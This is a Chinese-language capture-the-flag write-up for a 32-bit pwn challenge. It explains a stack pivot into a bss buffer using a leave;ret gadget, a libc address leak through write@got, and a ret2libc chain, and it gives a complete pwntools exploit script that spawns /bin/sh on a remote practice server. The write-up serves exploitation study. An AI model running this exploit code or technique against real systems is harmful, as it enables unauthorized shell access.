首先checksec发现是开启了nx的32位程序

![image-20201118204008644](https://static.hack1s.fun/images/2021/02/06/image-20201118204008644.png)

出现漏洞的函数就是一个read读入了0x200的字符

![image-20201118204124737](https://static.hack1s.fun/images/2021/02/06/image-20201118204124737.png)

一共存在两次这样有危险的读，m1，m2是两个字符串

但是需要注意的是第一次读才会造成比较长的溢出，第二次的读最多只有0x20

并且这里有一个地方就是，s是位于bss段的

buf是在栈上的，也就是说我们没办法在这个地方写太多东西

0x20-0x18是8，也就是可以控制ebp和ret addr

这道题是一道[栈迁移](https://river-li.github.io/2020/11/19/Stack-Pwn)的题目，控制ebp和ret addr之后让整个栈换位置

这里可以将return address填充为`leave;ret`的gadget

![image-20201119105423245](https://static.hack1s.fun/images/2021/02/06/image-20201119105423245.png)

查到这个gadget的位置



整个payload应该分成三部分：

1. 首先发送第一个payload，写在s的内容，是后面想要执行ret2libc的rop链内容；
2. 发送第二个payload，写在buf的内容，溢出ebp和return address，让栈的ebp和esp迁移到s的位置，这样之后会执行ret2libc那里想要泄漏的write函数got表地址；
3. 计算出libc的偏移，发送第三个payload布置之后system("/bin/sh")的栈ROP链
4. 发送第四个payload，溢出之后将栈迁移到目标位置



做的时候遇到了一些问题，发送payload的时候sendline发现就不行；

改成了send之后就没事了

```python
from pwn import *                                                                                                                                   
from LibcSearcher import *

io = remote('node3.buuoj.cn',29346)
#io = process('./spwn')
elf = ELF('./spwn')

io.recvuntil('?')

payload1 = 'a'*4
payload1 += p32(elf.plt['write']) + p32(elf.sym['main']) + p32(1) + p32(elf.got['write']) + p32(4)

io.send(payload1)

io.recvuntil('?')

payload2 = 'a'*0x18 + p32(elf.sym['s']) + p32(0x08048408)

io.send(payload2)

real_write = u32(io.recv(4))

io.recvuntil('?')

libc = LibcSearcher('write',real_write)
libc_base = real_write - libc.dump('write')

payload1 = 'a'*4
payload1 += p32(libc_base+libc.dump('system')) + p32(elf.sym['main']) + p32(libc_base+libc.dump('str_bin_sh')) 

io.send(payload1)
io.recvuntil('?')

io.send(payload2)

io.interactive()
```

